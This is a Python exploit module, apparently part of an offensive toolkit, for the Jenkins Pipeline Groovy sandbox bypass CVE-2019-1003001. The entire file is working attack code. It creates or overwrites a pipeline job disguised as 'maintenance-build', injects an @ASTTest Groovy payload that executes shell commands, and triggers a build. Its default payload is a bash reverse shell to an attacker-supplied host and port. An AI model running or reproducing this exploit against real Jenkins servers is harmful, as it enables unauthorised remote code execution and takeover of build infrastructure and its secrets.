"""
CVE-2019-1003001: Pipeline Groovy Plugin Sandbox Bypass

Pipeline: Groovy Plugin 2.61 and earlier allowed sandboxed Groovy scripts to execute
arbitrary code by exploiting vulnerabilities in how Groovy scripts were compiled,
allowing bypass of sandbox protection.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2019_1003001(ExploitModule):
    """Pipeline Groovy plugin sandbox bypass allowing arbitrary code execution."""

    CVE_ID = "CVE-2019-1003001"

    METADATA = ExploitMetadata(
        cve_id="CVE-2019-1003001",
        name="Pipeline Groovy Plugin Sandbox Bypass",
        description="Sandbox bypass in Pipeline Groovy allowing arbitrary code execution",
        affected_versions=["<= 2.61"],
        mitre_attack=["T1190", "T1059"],
        severity="high",
        references=[
            "https://jenkins.io/security/advisory/2019-01-08/",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-1003001",
            "https://www.cvedetails.com/cve/CVE-2019-1003001"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "groovy", "pipeline"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has vulnerable Pipeline Groovy plugin.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")

            if response.status_code == 200:
                data = response.json()
                for plugin in data.get('plugins', []):
                    if plugin.get('shortName') == 'workflow-cps':
                        return True
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2019-1003001 for sandbox bypass in Pipeline Groovy.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, cmd, job_name)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport')
        cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' if lhost and lport else None)
        job_name = kwargs.get('job_name', 'maintenance-build')

        if not cmd:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details="No command provided (lhost/lport or cmd required)",
                error="Missing required parameter: cmd or lhost+lport"
            )

        pipeline_script = f'''
@groovy.transform.ASTTest(value={{
    def cmd = ['/bin/bash', '-c', '{cmd}']
    cmd.execute()
}})
def x
pipeline {{
    agent any
    stages {{
        stage('Exploit') {{
            steps {{
                echo 'Sandbox bypassed'
            }}
        }}
    }}
}}
'''

        job_xml = f'''<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job@2.40">
  <description>Test pipeline</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.61">
    <script>{pipeline_script}</script>
    <sandbox>true</sandbox>
  </definition>
  <triggers/>
  <disabled>false</disabled>
</flow-definition>'''

        try:
            crumb_manager = CrumbManager(
                base_url=session.base_url,
                auth=session.auth,
                verify_ssl=False
            )
            crumb_manager.fetch()

            headers = {'Content-Type': 'application/xml'}
            headers.update(crumb_manager.get_header())

            create_url = f"/createItem?name={job_name}"
            response = session.post(create_url, data=job_xml, headers=headers)

            if response.status_code == 200:
                pass
            elif response.status_code == 400 and 'already exists' in response.text.lower():
                config_url = f"/job/{job_name}/config.xml"
                response = session.post(config_url, data=job_xml, headers=headers)

                if response.status_code != 200:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="failure",
                        details=f"Failed to update job: HTTP {response.status_code}"
                    )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to create job: HTTP {response.status_code}"
                )

            build_url = f"/job/{job_name}/build"
            response = session.post(build_url, headers=crumb_manager.get_header())

            if response.status_code in [200, 201, 302]:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Sandbox bypassed via malicious pipeline job '{job_name}'",
                    data={
                        "job_name": job_name,
                        "command": cmd,
                        "method": "@ASTTest in Pipeline script",
                        "job_url": f"{session.base_url}/job/{job_name}"
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="partial",
                    details=f"Job created but build trigger failed: HTTP {response.status_code}"
                )

        except Exception as e:
            if 'timeout' in str(e).lower():
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="partial",
                    details="Timeout during execution - build may have executed successfully"
                )

            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution error: {str(e)}"
            )
